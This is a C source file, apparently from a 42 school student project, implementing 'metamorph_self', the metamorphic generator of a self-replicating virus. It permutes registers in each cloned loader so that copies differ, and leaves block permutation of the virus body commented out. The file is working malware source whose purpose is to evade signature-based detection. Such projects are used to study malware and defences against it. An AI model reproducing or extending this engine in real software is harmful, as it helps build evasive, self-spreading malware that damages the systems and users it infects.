/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   metamorph_self.c                                   :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: anselme <anselme@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/12/11 01:29:20 by anselme           #+#    #+#             */
/*   Updated: 2021/06/15 20:16:06 by ichkamo          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <sys/mman.h>

#include "accessors.h"
#include "polymorphism.h"
#include "errors.h"
#include "loader.h"
#include "virus.h"

/*
** metamorph_self is a metamorphic generator for the virus and loader.
**   It applies intruction and register permutations on the clone's loader code
**   And block permutations on the clone's virus code
**
**   Some parts of the loader can't be reg-permutated because of
**   syscall calling conventions.
*/

bool		metamorph_self(struct safe_ptr clone, size_t *virus_size,
			int *virus_func_shift, size_t loader_off, uint64_t seed)
{
	// get clone loader pointer
	size_t	loader_size      = (size_t)loader_exit - (size_t)loader_entry;
	size_t	loader_entry_off = loader_off;
	void	*clone_loader    = safe(clone, loader_entry_off, loader_size);

	// get clone virus pointer
	size_t	loader_virus_dist = (size_t)virus - (size_t)loader_entry;
	size_t	virus_entry_off   = loader_off + loader_virus_dist;
	void	*clone_virus      = safe(clone, virus_entry_off, *virus_size);

	if (!clone_loader || !clone_virus)
		return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);

	// struct safe_ptr	father_virus = (struct safe_ptr){
	// 	.ptr  = clone_virus,
	// 	.size = *virus_size
	// };
	// struct safe_ptr	dest = (struct safe_ptr){
	// 	.size = virus_size * 2, // TODO tmp virus_size*2 worse case scenario
	// 	.ptr  = sys_mmap(0, virus_size * 2, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)
	// };
	// if (dest.ptr == NULL) return errors(ERR_SYS, _ERR_MMAP_FAILED);

	// metamorph self and client
	if (!true
	|| !permutate_registers(clone_loader, seed, loader_size)
	// || !permutate_blocks(father_virus, dest, virus_size, virus_func_shift, seed)
	|| !true)
		return errors(ERR_THROW, _ERR_METAMORPH_SELF);

	return true;
}
